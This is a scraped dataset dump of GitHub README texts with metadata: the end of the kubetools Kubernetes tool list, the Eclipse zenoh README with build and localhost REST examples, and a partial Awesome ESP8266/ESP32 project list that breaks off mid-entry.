GlusterFS in background\nMultiple Tools Repo\nChaos Toolkit Kubernetes Support - Kubernetes driver extension of the Chaos Toolkit probes and actions API\nk14s - Kubernetes Tools that follow Unix philosophy to be simple and composable\nPulumi - Pulumi - Modern Infrastructure as Code. Any cloud, any language. Give your team cloud superpowers rocket https://www.pulumi.com\nNon-Categorize\nRudr - A Kubernetes implementation of the Open Application Model specification\nKeel - Kubernetes Operator to automate Helm, DaemonSet, StatefulSet & Deployment updates\nCabin, the mobile app for Kubernetes - The Mobile Dashboard for Kubernetes\nFunktion - CLI tool for working with funktion\nAlterant - A simple Kubernetes configuration modifier\nBUCK - Brigade Universal Controller for Kubernetes\nkube-fledged - A kubernetes add-on for creating and managing a cache of container images directly on the cluster worker nodes, so application pods start almost instantly\nKubecost - Cross-cloud cost allocation models for workloads running on Kubernetes\nkpt - toolkit to help you manage, manipulate, customize, and apply Kubernetes Resource configuration\ncapsule - Capsule helps to implement a multi-tenancy and policy-based environment in your Kubernetes cluster\nMaintainer\nApurva Bhandari\nAjeet Singh Raina\nLast Updated: 25 Oct, 2021\nLICENSE\nApache License 2.0\nStargazers over time", "link": "https://github.com/collabnix/kubetools", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "kubetools - a curated list of kubernetes tools\nthere are more than 200+ kubernetes certified service providers and tons of distributions. choosing a right distribution can be a daunting task. kubetools is built with a purpose. it is contributed and managed by collabnix community to target the most popular tools and technique and coming up with the best practices around these tools.\ncurrently, we are maintaining a database of 300+ kubernetes tools but there is a plan to take it to next step and help you pick up the most popular -----> tool !!!  for your infrastructure.\nhave questions? join us over slack and get chance to be a part of 5500+ devops enthusiasts.\nwant to contribute? click here and get your favorite tool added.\ncluster management\nkops - production grade k8s installation, upgrades, and management\nsilver-surfer - check apiversion compatibility and provide migration path for kubernetes objects when upgrading kubernetes to latest versions\nkube-ops-view - kubernetes operational view - read-only system dashboard for multiple k8s clusters\nkubeprompt - kubernetes prompt info\nmetalk8s - an opinionated kubernetes distribution with a focus on long-term on-prem deployments\nkind - kubernetes in docker - local clusters for testing kubernetes\nclusterman - cluster autoscaler for kubernetes and mesos\ncert-manager - automatically provision and manage tls certificates\ngoldilocks - get your resource requests \"just right\"\nkatafygio - dump, or continuously backup kubernetes objets as yaml files in git\nrancher - complete container management platform\nsealed secrets - a kubernetes controller and tool for one-way encrypted secrets\nopenkruise/kruise - automate application workloads management on kubernetes https://openkruise.io\nkubectl snapshot - take cluster snapshots\nkapp - simple deployment tool focused on the concept of \"kubernetes application\" \u2014 a set of resources with the same label https://get-kapp.io\nkeda - event-driven autoscaler for kubernetes\noctant - to better understand the complexity of kubernetes clusters\nportainer - portainer inside a kubernetes environment\ngardener - deliver fully-managed clusters at scale everywhere with your own kubernetes-as-a-service\nkubed - kubernetes cluster operator daemon\nkubestack - kubestack is the free and open-source gitops framework to codify your custom platform stack using terraform.\ncluster with core cli tools\nbootkube - bootkube - launch a self-hosted kubernetes cluster\nkubectx + kubens - switch faster between clusters and namespaces in kubectl\nkube-shell - kubernetes shell: an integrated shell for working with the kubernetes\nkuttle: kubectl wrapper for sshuttle without ssh - kubernetes wrapper for sshuttle\nkubectl sudo - run kubernetes commands with the security privileges of another user\nk9s - kubernetes cli to manage your clusters in style!\nktunnel - a cli that exposes your local resources to kubernetes\nkubeoperator - run kubectl command in web browser. https://kubeoperator.io/\nvimkubectl - manage any kubernetes resource from vim https://www.vim.org/scripts/script.ph\nkubehelper - kubehelper - simplifies many daily kubernetes cluster tasks through a web interface.\nalert and monitoring\nthanos - highly available prometheus setup with long term storage capabilities. cncf sandbox project. https://thanos.io\nprometheus - the prometheus monitoring system and time series database.\ngrafana - the tool for beautiful monitoring and metric analytics & dashboards for graphite, influxdb & prometheus & more\nkubetail - bash script to tail kubernetes logs from multiple pods at the same time\nsearchlight - alerts for kubernetes\nlinkerd2 monitoring mixin for grafana - grafana dashboards for linkerd2 monitoring and can work in standalone (default) or in multi cluster setup\nkuberhaus - kubernetes resource dashboard with node/pod layout and resource requests\nkubernetes job/cronjob notifier - this tool sends an alert to slack whenever there is a kubernetes cronjob/job failure/success\nargus - this tool monitors changes in the filesystem on specified paths\nlogging and tracing\njaeger - cncf jaeger, a distributed tracing platform\nkiali - kiali project, observability for the istio service mesh\nelk - elasticsearch, logstash, kibana\nfluentbit - fast and lightweight log processor and forwarder for linux, bsd and osx\nloki - like prometheus, but for logs\ntroubleshooting\nkubectl-debug - allows you to run a new container with all the troubleshooting tools installed in running pod for debugging purpose\npowerfulseal - a powerful testing tool for kubernetes clusters\ncrash-diagnostic - crash-diagnostics is a tool to help investigate, analyze, and troubleshoot unresponsive or crashed kubernetes clusters\nk9s - kubernetes cli to manage your clusters in style!\nkubernetes cli plugin - doctor - kubectl cluster triage plugin for k8s - \ud83c\udfe5 (brew doctor equivalent)\nknative inspect - a light-weight debugging tool for knative's system components\nkubeman - to find information from kubernetes clusters, and to investigate issues related to kubernetes and istio\nkpexec - kpexec is a kubernetes cli that runs commands in a container with high privileges\ndevelopement tools/kit\nokteto: a tool for cloud native developers - build better applications by developing and testing your code directly in kubernetes\ntilt: tilt manages local development instances for teams that deploy to kubernetes - local kubernetes development with no stress\ngarden: kubernetes from source to finish - development orchestrator for kubernetes, containers and functions.\nkubernix - single dependency kubernetes clusters for local testing, experimenting and development\ncopper - a configuration file validator for kubernetes\nko - build and deploy go applications on kubernetes\ndekorate - java annotation processors for kubernetes\nlens ide the kubernetes ide\nkosko - organize kubernetes manifests in javascript\ntelepresence - fast, local development for kubernetes and openshift microservices\nmonokle - desktop ui for managing kubernetes manifests\nkr8s - desktop application made for developers that need to monitor and visualize their kubernetes clusters in a user friendly gui\nalternative tools for developement\nminikube - minikube implements a local kubernetes cluster\nkubesphere - easy-to-use production ready container platform https://kubesphere.io\nskippbox - a desktop application for k8s\nkind - kubernetes in docker - local clusters for testing kubernetes https://kind.sigs.k8s.io/\nk3d - k3d is a lightweight wrapper to run k3s (rancher lab\u2019s minimal kubernetes distribution) in docker.\nci/cd integration tools\nhybridk8s droid - intelligence foor your favourite delivery platform\ndevtron - software delivery workflow for kubernetes\nskaffold - easy and repeatable kubernetes development\napollo - apollo - the logz.io continuous deployment solution over kubernetes\nhelm cabin - web ui that visualizes helm releases in a kubernetes cluster\nflagger - progressive delivery kubernetes operator (canary, a/b testing and blue/green deployments)\nkubeform - kubernetes crds for terraform providers https://kubeform.com\nspinnaker - spinnaker is an open source, multi-cloud continuous delivery platform for releasing software changes with high velocity and confidence. http://www.spinnaker.io/\nwerf - gitops tool to deliver apps to kubernetes and integrate this process with gitlab and other ci tools\nflux - gitops kubernetes operator\nargo cd - declarative continuous deployment for kubernetes\ntekton - a cloud native continuous integration and delivery (ci/cd) solution\njenkins x - jenkins x provides automated ci+cd for kubernetes with preview environments on pull requests using tekton, knative, lighthouse, skaffold and helm\nkubevela - kubevela works as an application delivery control plane that is fully decoupled from runtime infrastructure\nksonnet - a cli-supported framework that streamlines writing and deployment of kubernetes configurations to multiple clusters\ncircleci - a cloud-based tool that helps build continuous integration and continuous delivery pipelines to kubernetes.\nsecurity tools\nterrascan - detect compliance and security violations across infrastructure as code to mitigate risk before provisioning cloud native infrastructure.\nklum - kubernetes lazy user manager\nkyverno - kubernetes native policy management https://kyverno.io\nkiosk - kiosk office multi-tenancy extension for kubernetes - secure cluster sharing & self-service namespace provisioning\nkube-bench - cis kubernetes benchmark tool\nkube-hunter - pentesting tool - hunts for security weaknesses in kubernetes clusters\nkube-who-can - show who has rbac permissions to perform actions on different resources in kubernetes\nstarboard - kubernetes-native security toolkit\nsimulator - kubernetes security training platform - focussing on security mitigation\nrbac lookup - easily find roles and cluster roles attached to any user, service account, or group name in your kubernetes cluster https://fairwinds.com\nkubeaudit - kubeaudit helps you audit your kubernetes clusters against common security controls\ngangway - an application that can be used to easily enable authentication flows via oidc for a kubernetes cluster\naudit2rbac - autogenerate rbac policies based on kubernetes audit logs\nchartsec - helm chart security scanner\nkubestriker - security auditing tool\ndatree - cli tool to prevent k8s misconfigurations by ensuring that manifests and helm charts follow best practices as well as your organization\u2019s policies\nkrane - kubernetes rbac static analysis & visualisation tool\nflaco - the falco project - cloud-native runtime security\nclair - vulnerability static analysis for containers\nanchore cli - coomand line interface built on top of anchore engine to manage and inspect images, policies, subscriptions and registries\nproject quay - container image registry designed to boost the security of your repositories via vulnerability scanning and tight access control\nkubescape - tool to test if kubernetes is deployed securely according to multiple frameworks: regulatory, customized company policies and devsecops best practices, such as the nsa-cisa and the mitre att&ck\u00ae\nnetwork policies\ntrireme-kubernetes - aporeto integration with kubernetes network policies\ncalico - cloud native connectivity and network policy\nkubepox - kubernetes network policy exploration tool\nkokotap - tools for kubernetes pod network tapping\nsubmariner - connect all your kubernetes clusters, no matter where they are in the world\negress-operator - an operator to produce egress gateway pods and control access to them with network policies\nkubefwd (kube forward) - bulk port forwarding kubernetes services for local development\ntesting tools\nk6 - a modern load testing tool, using go and javascript\nnetwork bandwith and load testing - test suite for kubernetes\ntest-infra - test infrastructure for the kubernetes project\nkube-score - kubernetes object analysis with recommendations for improved reliability and security\nlitmus - cloud-native chaos engineering; kubernetes-native chaos engineering; chaos engineering for kubernetes\npowerfulseal - a powerful testing tool for kubernetes clusters\nkube-burner - kube-burner is a tool aimed at stressing kubernetes clusters\nkube-monkey - kube-monkey randomly deletes k8 pods in the cluster to validate failure-resilient services\nconftest - write tests against structured configuration data using the open policy agent rego query language\nservice mesh\nistio - connect, secure, control, and observe services\ntraefik - the cloud native edge router\nnginx ingress controller - nginx and nginx plus ingress controllers for kubernetes\nautopilot - the service mesh sdk\nlinkerd-config - a kubernetes controller that knows how to reconcile the linkerd configuration\nkong - kong for kubernetes: the official ingress controller for kubernetes\nosm - open service mesh (osm) is a lightweight, extensible, cloud native service mesh\nlayer5 - layer5, the service mesh company, representing every service mesh\ngloo mesh - the service mesh orchestration platform\napisix apache apisix is a dynamic, real-time, high-performance api gateway.\nobservability\nkubespy - tools for observing kubernetes resources in real time\npopeye - a kubernetes cluster resource sanitizer\nstern - multi pod and container log tailing for kubernetes\ncri-tools - cli and validation tools for kubelet container runtime interface (cri)\nkubebox - terminal and web console for kubernetes\nkubewatch - watch k8s events and trigger handlers\nkube-state-metrics - add-on agent to generate and expose cluster-level metrics\nsloop - kubernetes history visualization\nkubectl tree \ud83c\udf84 - kubectl plugin to observe object hierarchies through ownerreferences\nchaoskube - chaoskube periodically kills random pods in your kubernetes cluster\nbotkube - helps you monitor your kubernetes cluster(s), debug critical deployments and gives recommendations for standard practices\nkubestone - kubestone is a benchmarking operator that can evaluate the performance of kubernetes installations\nchaos mesh - a chaos engineering platform for kubernetes\nlemur - lemur: observability and context\nkubernetes-event-exporter - export kubernetes events to multiple destinations with routing and filtering\nkubevious - kubevious provides a usable and highly graphical interface for kubernetes\nmachine learning/deep learning\nkubeflow - machine learning toolkit for kubernetes\nvolcano - a kubernetes native batch system\ncompute edge tools\nkubeedge - kubernetes native edge computing framework\nkubeless - kubernetes native serverless framework\nkubernetes tools for specific cloud\nkubernetes on aws (kube-aws) - a command-line tool to declaratively manage kubernetes clusters on aws\ndraft: streamlined kubernetes development - a tool for developers to create cloud-native applications on kubernetes\nhelm-ssm - a low dependency tool for retrieving and injecting secrets from aws ssm into helm\nskupper - multicloud communication for kubernetes\nstorage providers\nchubaofs - distributed file system and object storage\nlonghorn - cloud-native distributed block storage built on and for kubernetes\nopenebs - kubernetes native - hyperconverged block storage with multiple storage engines\nrook - storage orchestration for kubernetes\nseaweedfs - distributed file system supports read-write many volumes\ntikv - distributed transactional key-value database\nvelero - backup and migrate kubernetes applications and their persistent volumes\nvitess - vitess is a database clustering system for horizontal scaling of mysql\nkadalu - a lightweight persistent storage solution for kubernetes / openshift using glusterfs in background\nmultiple tools repo\nchaos toolkit kubernetes support - kubernetes driver extension of the chaos toolkit probes and actions api\nk14s - kubernetes tools that follow unix philosophy to be simple and composable\npulumi - pulumi - modern infrastructure as code. any cloud, any language. give your team cloud superpowers rocket https://www.pulumi.com\nnon-categorize\nrudr - a kubernetes implementation of the open application model specification\nkeel - kubernetes operator to automate helm, daemonset, statefulset & deployment updates\ncabin, the mobile app for kubernetes - the mobile dashboard for kubernetes\nfunktion - cli tool for working with funktion\nalterant - a simple kubernetes configuration modifier\nbuck - brigade universal controller for kubernetes\nkube-fledged - a kubernetes add-on for creating and managing a cache of container images directly on the cluster worker nodes, so application pods start almost instantly\nkubecost - cross-cloud cost allocation models for workloads running on kubernetes\nkpt - toolkit to help you manage, manipulate, customize, and apply kubernetes resource configuration\ncapsule - capsule helps to implement a multi-tenancy and policy-based environment in your kubernetes cluster\nmaintainer\napurva bhandari\najeet singh raina\nlast updated: 25 oct, 2021\nlicense\napache license 2.0\nstargazers over time", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000251, "year": null}, {"Unnamed: 0": 257, "autor": 257, "date": null, "content": "Eclipse zenoh\nThe Eclipse zenoh: Zero Overhead Pub/sub, Store/Query and Compute.\nEclipse zenoh (pronounce /zeno/) unifies data in motion, data in-use, data at rest and computations. It carefully blends traditional pub/sub with geo-distributed storages, queries and computations, while retaining a level of time and space efficiency that is well beyond any of the mainstream stacks.\nCheck the website zenoh.io for more detailed information.\nHow to install and test it\nSee our \"Getting started\" tour starting with the zenoh key concepts.\nHow to build it\nInstall Cargo and Rust. Zenoh can be succesfully compiled with Rust stable (>= 1.5.1), so no special configuration is required from your side.\nTo build zenoh, just type the following command after having followed the previous instructions:\n$ cargo build --release --all-targets\nThe zenoh router is built as target/release/zenohd. All the examples are built into the target/release/examples directory. They can all work in peer-to-peer, or interconnected via the zenoh router.\nPrevious 0.5 API:\nThe following documentation pertains to the v0.6 API, which comes many changes to the behaviour and configuration of Zenoh.\nTo access the v0.5 version of the code and matching README, please go to the 0.5.0-beta.9 tagged version.\nQuick tests of your build:\nPeer-to-peer tests:\npub/sub\nrun: ./target/release/examples/z_sub\nin another shell run: ./target/release/examples/z_put\nthe subscriber should receive the publication.\nget/eval\nrun: ./target/release/examples/z_eval\nin another shell run: ./target/release/examples/z_get\nthe eval should display the log in its listener, and the get should receive the eval result.\nRouted tests:\nput/store/get\nrun the zenoh router with a memory storage:\n./target/release/zenohd --cfg='plugins/storages/backends/memory/storages/demo/key_expr:\"/demo/example/**\"'\nin another shell run: ./target/release/examples/z_put\nthen run ./target/release/examples/z_get\nthe get should receive the stored publication.\nREST API using curl tool\nrun the zenoh router with a memory storage:\n./target/release/zenohd --cfg='plugins/storages/backends/memory/storages/demo/key_expr:\"/demo/example/**\"'\nin another shell, do a publication via the REST API:\ncurl -X PUT -d 'Hello World!' http://localhost:8000/demo/example/test\nget it back via the REST API:\ncurl http://localhost:8000/demo/example/test\nrouter admin space via the REST API\nrun the zenoh router with a memory storage:\n./target/release/zenohd --cfg='plugins/storages/backends/memory/storages/demo/key_expr:\"/demo/example/**\"'\nin another shell, get info of the zenoh router via the zenoh admin space:\ncurl http://localhost:8000/@/router/local\nget the backends of the router (only memory by default):\ncurl 'http://localhost:8000/@/router/local/**/backends/*'\nget the storages of the local router (the memory storage configured at startup on '/demo/example/**' should be present):\ncurl 'http://localhost:8000/@/router/local/**/storages/*'\nadd another memory storage on /demo/mystore/**:\ncurl -X PUT -H 'content-type:application/json' -d '\"/demo/mystore/**\"' http://localhost:8000/@/router/local/config/plugins/storages/backends/memory/storages/my-storage/key_expr\ncheck it has been created:\ncurl 'http://localhost:8000/@/router/local/**/storages/*'\nSee other examples of zenoh usage in zenoh/examples/zenoh\nzenoh router command line arguments\nzenohd accepts the following arguments:\n-c, --config <FILE>: a JSON5 configuration file. EXAMPLE_CONFIG.json5 shows the schema of this file. All properties of this configuration are optional, so you may not need such a large configuration for your use-case.\n--cfg <KEY>:<VALUE> : allows you to change specific parts of the configuration right after it has been constructed. VALUE must be a valid JSON5 value, and key must be a path through the configuration file, where each element is separated by a /. When inserting in parts of the config that are arrays, you may use indexes, or may use + to indicate that you want to append your value to the array. --cfg passed values will always override any previously existing value for their key in the configuration.\n-l, --listener <LOCATOR>...: A locator on which this router will listen for incoming sessions. Repeat this option to open several listeners. By default, tcp/0.0.0.0:7447 is used. The following locators are currently supported:\nTCP: tcp/<host_name_or_IPv4>:<port>\nUDP: udp/<host_name_or_IPv4>:<port>\nTCP+TLS: tls/<host_name_or_IPv4>:<port>\nQUIC: quic/<host_name_or_IPv4>:<port>\n-e, --peer <LOCATOR>...: A peer locator this router will try to connect to. Repeat this option to connect to several peers.\n--no-multicast-scouting: By default zenohd replies to multicast scouting messages for being discovered by peers and clients. This option disables this feature.\n-i, --id <hex_string>: The identifier (as an hexadecimal string - e.g.: 0A0B23...) that zenohd must use. WARNING: this identifier must be unique in the system! If not set, a random UUIDv4 will be used.\n--no-timestamp: By default zenohd adds a HLC-generated Timestamp to each routed Data if there isn't already one. This option disables this feature.\n-P, --plugin <PATH_TO_PLUGIN_LIB>...: A plugin that must be loaded. Repeat this option to load several plugins.\n--plugin-search-dir <DIRECTORY>...: A directory where to search for plugins libraries to load. Repeat this option to specify several search directories'. By default, the plugins libraries will be searched in: '/usr/local/lib:/usr/lib:~/.zenoh/lib:.'\n--rest-http-port <rest-http-port>: Configures the REST plugin's HTTP port. Accepted values:\na port number\na string with format <local_ip>:<port_number> (to bind the HTTP server to a specific interface)\n\"None\" to desactivate the REST plugin\nIf not specified, the REST plugin will be active on any interface (0.0.0.0) and port 8000.\nPlugins\nBy default the zenoh router is delivered or built with 2 plugins. These may be configured through a configuration file, or through individual changes to the configuration via the --cfg cli option or via zenoh puts on individual parts of the configuration.\nWARNING: since v0.6, zenohd no longer loads every available plugin at startup. Instead, only configured plugins are loaded (after processing --cfg and --plugin options). Currently, plugins may only be loaded at startup.\nNote that the REST plugin is added to the configuration by the default value of the --rest-http-port CLI argument.\nREST plugin (exposing a REST API): This plugin converts GET and PUT REST requests into Zenoh gets and puts respectively.\nStorages plugin (managing backends and storages) This plugin allows you to easily define storages. These will store key-value pairs they subscribed to, and send the most recent ones when queried. Check out EXAMPLE_CONFIG.json5 for info on how to configure them.\nTroubleshooting\nIn case of troubles, please first check on this page if the trouble and cause are already known.\nOtherwise, you can ask a question on the zenoh Gitter channel, or create an issue.", "link": "https://github.com/eclipse-zenoh/zenoh", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "eclipse zenoh\nthe eclipse zenoh: zero overhead pub/sub, store/query and compute.\neclipse zenoh (pronounce /zeno/) unifies data in motion, data in-use, data at rest and computations. it carefully blends traditional pub/sub with geo-distributed storages, queries and computations, while retaining a level of time and space efficiency that is well beyond any of the mainstream stacks.\ncheck the website zenoh.io for more detailed information.\nhow to install and test it\nsee our \"getting started\" tour starting with the zenoh key concepts.\nhow to build it\ninstall cargo and rust. zenoh can be succesfully compiled with rust stable (>= 1.5.1), so no special configuration is required from your side.\nto build zenoh, just type the following command after having followed the previous instructions:\n$ cargo build --release --all-targets\nthe zenoh router is built as target/release/zenohd. all the examples are built into the target/release/examples directory. they can all work in peer-to-peer, or interconnected via the zenoh router.\nprevious 0.5 api:\nthe following documentation pertains to the v0.6 api, which comes many changes to the behaviour and configuration of zenoh.\nto access the v0.5 version of the code and matching readme, please go to the 0.5.0-beta.9 tagged version.\nquick tests of your build:\npeer-to-peer tests:\npub/sub\nrun: ./target/release/examples/z_sub\nin another shell run: ./target/release/examples/z_put\nthe subscriber should receive the publication.\nget/eval\nrun: ./target/release/examples/z_eval\nin another shell run: ./target/release/examples/z_get\nthe eval should display the log in its listener, and the get should receive the eval result.\nrouted tests:\nput/store/get\nrun the zenoh router with a memory storage:\n./target/release/zenohd --cfg='plugins/storages/backends/memory/storages/demo/key_expr:\"/demo/example/**\"'\nin another shell run: ./target/release/examples/z_put\nthen run ./target/release/examples/z_get\nthe get should receive the stored publication.\nrest api using curl -----> tool !!! \nrun the zenoh router with a memory storage:\n./target/release/zenohd --cfg='plugins/storages/backends/memory/storages/demo/key_expr:\"/demo/example/**\"'\nin another shell, do a publication via the rest api:\ncurl -x put -d 'hello world!' http://localhost:8000/demo/example/test\nget it back via the rest api:\ncurl http://localhost:8000/demo/example/test\nrouter admin space via the rest api\nrun the zenoh router with a memory storage:\n./target/release/zenohd --cfg='plugins/storages/backends/memory/storages/demo/key_expr:\"/demo/example/**\"'\nin another shell, get info of the zenoh router via the zenoh admin space:\ncurl http://localhost:8000/@/router/local\nget the backends of the router (only memory by default):\ncurl 'http://localhost:8000/@/router/local/**/backends/*'\nget the storages of the local router (the memory storage configured at startup on '/demo/example/**' should be present):\ncurl 'http://localhost:8000/@/router/local/**/storages/*'\nadd another memory storage on /demo/mystore/**:\ncurl -x put -h 'content-type:application/json' -d '\"/demo/mystore/**\"' http://localhost:8000/@/router/local/config/plugins/storages/backends/memory/storages/my-storage/key_expr\ncheck it has been created:\ncurl 'http://localhost:8000/@/router/local/**/storages/*'\nsee other examples of zenoh usage in zenoh/examples/zenoh\nzenoh router command line arguments\nzenohd accepts the following arguments:\n-c, --config <file>: a json5 configuration file. example_config.json5 shows the schema of this file. all properties of this configuration are optional, so you may not need such a large configuration for your use-case.\n--cfg <key>:<value> : allows you to change specific parts of the configuration right after it has been constructed. value must be a valid json5 value, and key must be a path through the configuration file, where each element is separated by a /. when inserting in parts of the config that are arrays, you may use indexes, or may use + to indicate that you want to append your value to the array. --cfg passed values will always override any previously existing value for their key in the configuration.\n-l, --listener <locator>...: a locator on which this router will listen for incoming sessions. repeat this option to open several listeners. by default, tcp/0.0.0.0:7447 is used. the following locators are currently supported:\ntcp: tcp/<host_name_or_ipv4>:<port>\nudp: udp/<host_name_or_ipv4>:<port>\ntcp+tls: tls/<host_name_or_ipv4>:<port>\nquic: quic/<host_name_or_ipv4>:<port>\n-e, --peer <locator>...: a peer locator this router will try to connect to. repeat this option to connect to several peers.\n--no-multicast-scouting: by default zenohd replies to multicast scouting messages for being discovered by peers and clients. this option disables this feature.\n-i, --id <hex_string>: the identifier (as an hexadecimal string - e.g.: 0a0b23...) that zenohd must use. warning: this identifier must be unique in the system! if not set, a random uuidv4 will be used.\n--no-timestamp: by default zenohd adds a hlc-generated timestamp to each routed data if there isn't already one. this option disables this feature.\n-p, --plugin <path_to_plugin_lib>...: a plugin that must be loaded. repeat this option to load several plugins.\n--plugin-search-dir <directory>...: a directory where to search for plugins libraries to load. repeat this option to specify several search directories'. by default, the plugins libraries will be searched in: '/usr/local/lib:/usr/lib:~/.zenoh/lib:.'\n--rest-http-port <rest-http-port>: configures the rest plugin's http port. accepted values:\na port number\na string with format <local_ip>:<port_number> (to bind the http server to a specific interface)\n\"none\" to desactivate the rest plugin\nif not specified, the rest plugin will be active on any interface (0.0.0.0) and port 8000.\nplugins\nby default the zenoh router is delivered or built with 2 plugins. these may be configured through a configuration file, or through individual changes to the configuration via the --cfg cli option or via zenoh puts on individual parts of the configuration.\nwarning: since v0.6, zenohd no longer loads every available plugin at startup. instead, only configured plugins are loaded (after processing --cfg and --plugin options). currently, plugins may only be loaded at startup.\nnote that the rest plugin is added to the configuration by the default value of the --rest-http-port cli argument.\nrest plugin (exposing a rest api): this plugin converts get and put rest requests into zenoh gets and puts respectively.\nstorages plugin (managing backends and storages) this plugin allows you to easily define storages. these will store key-value pairs they subscribed to, and send the most recent ones when queried. check out example_config.json5 for info on how to configure them.\ntroubleshooting\nin case of troubles, please first check on this page if the trouble and cause are already known.\notherwise, you can ask a question on the zenoh gitter channel, or create an issue.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000257, "year": null}, {"Unnamed: 0": 266, "autor": 266, "date": null, "content": "Awesome ESP\nA curated list of awesome ESP8266/32 projects and code.\nBoth the ESP8266 and the ESP32 are low-cost Wi-Fi microchips with full TCP/IP stack and microcontroller capabilities produced by the Shanghai-based manufacturer Espressif Systems.\nSee Contributing for information on how to contribute to this list.\nContents\nFirmware\nTools\nProjects\nSmart Home and IoT\nInfoSec\nBiomedical\nOthers\nLibraries\nFirmware\nEspressif AT - The default vanilla firmware for the ESP8266.\nNodeMCU - An eLua-based firmware for the ESP8266.\nESPBasic - A BASIC firmware for easy and wireless programming, ready for the 8266.\nMicroPython - An implemention of Python3 for the ESP8266 and 32.\nESP32 - An experimental firmware for 3D Printers, both the ESP32 and 8266.\nFrankenstein - A quick and dirty firmware with cool features for the ESP8266.\nMongooseOS - An IoT specific firmware, with both C and JS. Available for the ESP32/8266.\nDeviceHive - A firmware made as a client for DeviceHive's IoT data platform, only for the 8266.\nRT-Thread - Chinese open source firmware available for the ESP32.\nSming Framework - Superb C/C++ IoT Framework with support for ESP8266 and ESP32.\nTools\nESP Flash Tool - The vanilla firmware flasher for both ESP's.\nArduino Core/8266 - The Arduino core for the ESP8266.\nArduino Core/32 - The other Arduino core for the ESP32.\nESPTool - Espressif's command line tool for bootloader comms in both ESP's.\nESP-Open-SDK - An open SDK for the ESP8266.\nESPTool-ck - A CLI tool for flashing in the ESP8266.\nESPTool-gui - A flashing GUI tool based on ESPTool-ck.\nNodeMCU Flasher - NodeMCU's official flashing tool for its OS.\nLuaNode - A lua-only SDK for 32/8266.\nTuya-Convert - A Wi-Fi firmware flasher ESP8266 that has been pre-loaded with Tuya firmware.\nTasmotizer - A graphical flashing tool for Tasmota firmware. Can manage Wi-Fi & MQTT settings, modules & templates.\nArduino FS Plugin - An Arduino plugin for filesystem uploads in the 8266.\nPlatformIO - Cross Platform IDE and Debugger that supports both the ESP32 and ESP8266.\nProjects\nSmart Home and IoT\nOpenMQTTGateway - An implementation of a multiprotocol MQTT gateway for both ESP's among other devices.\nESPHome - A full-featured system for controlling ESP's through simple yet powerful configuration files and Home Automation systems.\nTasmota - An alternative firmware for Sonoff & other ESP8266/ESP32 devices. Includes a large collection of sensor drivers & integrates with Home Assistant natively or via MQTT.\nSonoff-Homekit - An alternative firmware for Sonoff devices (and other 8266 devices) which allows control through Apple's Homekit.\nDoorsignEPD - A smart... doorsign with an E-Paper display using the ESP32.\nEPaperWeatherDisplay - A very cute e-ink weather display using the ESP32.\nSuperGreenOS - A full-featured home farming automation software for the ESP32.\nCanAirIO - Citizen science project that uses mobile and fixed stations to measure air quality with ESP32 and smartphones.\nInfoSec\nESP32-BLECollector - A wardriving device which displays BLE devices and collects data from them, all in a nice screen interface.\nESP32Marauder - An integrated suite of offensive and defensive tools for WiFi and Bluetooth.\nArduinoPcap - A library which allows generation of .pcap files with network traffic, for both ESP's.\nWiFi Satellite - A giant Wifi \"satellite\" that can monitor all 14 2.4Ghz channels using, well, 14 ESP32s.\nESP8266 Deauther - A very cool pseudojammer (deauther) of Wifi networks that uses the ESP8266.\nPacketMonitor - A beautiful OLED monitor for packet activity in a WiFi channel. Two versions for each ESP.\nWiFiDuck - A wireless-enabled keystroke injector, analogous, but even more awesome than the Rubber Ducky.\nESP8266 Beacon Spam - Want to confuse people? This device creates hundreds of fake WiFi networks.\nDeauthDetector - A small device that shines a light if it detects a WiFi deauth attack. Made by the same guy as the last six projects.\nBiomedical\nHeartyPatch - A wearable BLE and WiFi connected ECG-HR patch which uses the ESP32.\nHealthyPi v4 - An amazing open source vital signs monitor that can monitor ECG, respiration, pulse oximetry and body temperature, all run by an ESP32.\nLoRa\nMeshtastic - ESP32 LoRA boards as secure, long battery life, mesh GPS communicators.\nESP32-Paxcounter Wifi & Bluetooth driven, LoRaWAN enabled, battery powered mini Paxcounter built on cheap ESP32 LoRa IoT boards\nDisaster Radio - A disaster-resilient communications network powered by the sun\nOthers\nOpen SmartWatch - A FOSS smartwatch with GPS, an inertial unit and an extremely cool 3D-printed case.\nSoftRF - A DIY aviation proximity awareness system that can be used in UAV projects.\nRetro ESP32 - An extremely cool launcher for the Odroid Go (with the ESP32), which allows emulating several retro consoles.\nPedalinoMini - A wireless MIDI pedal controller for guitarists, built with the ESP32.\nStickWatch - A smartwatch module based on the M5Stick, using the ESP32.\nDroneBridge - An implementation of DroneBridge, a signal link for drones and UAV's on the ESP32.\nLibraries\nWasm3 - A lightning fast WebAssembly interpreter designed for embedded devices, compatible with both ESP's.\nHomie8266 - Framework implementation of the Homie protocol for the 8266.\nESP-Dash - Beautiful and fast framework for creating remote dashboards in the 8266/32. No internet required.\nESP_mqtt - MQTT helper library for the ESP8266.\nGUIslice - A drag and drop GUI framework for several devices and screen controllers. Compatible with 8266 and 32.\nMicroWebSrv2 - A very powerful MicroPython web server which can be used in the ESP32.\nIRremoteESP8266 - Emit and receive IR signals in the ESP8266.\nesphomelib - Framework to integrate with HomeAssistant in the 8266.\nTTS - A somehow good text to speech library for several Arduino devices, both ESP's included.\nFree802.11 - Library to emit arbitrary 802.11 signals with the ESP32.\nKoyn - A decentralized Bitcoin library for the ESP32 and the ESP8266.\nTFTLibrary - TFT compatibility for the ESP32.\nUTFT-ESP - UTFT Support for the ESP32/8266.\nESPAudio - Library for playing a diverse range of audio formats in the ESP8266/ESP32.\nAsyncTCP - Asynchronous TCP Library for both the 8266 and the 32.\nESP-HomeKit - Homekit implementation for 8266 on RTOS.\nESPHelper - MQTT and Wi-fi automation-oriented library for the 8266.\nESPHelper/32 - Port of the ESPHelper library for the 32.\nESP8266Wifi - Simple Arduino Wifi library for the 8266.\nWiFiESP - Arduino library for Wifi management, client/server for 8266 board.\nTinyGSM - A quick and simple Arduino library for interaction with GSM modules which can also control the 8266 through AT commands.\nmJS - A lightweight and restricted JS engine that is used by MongooseOS, compatible on the 32 and 8266.\nESPUI - A simply library for making interactive web interfaces for both ESP's.\nESP32 ePaper - A full-featured library for using ePaper modules with the 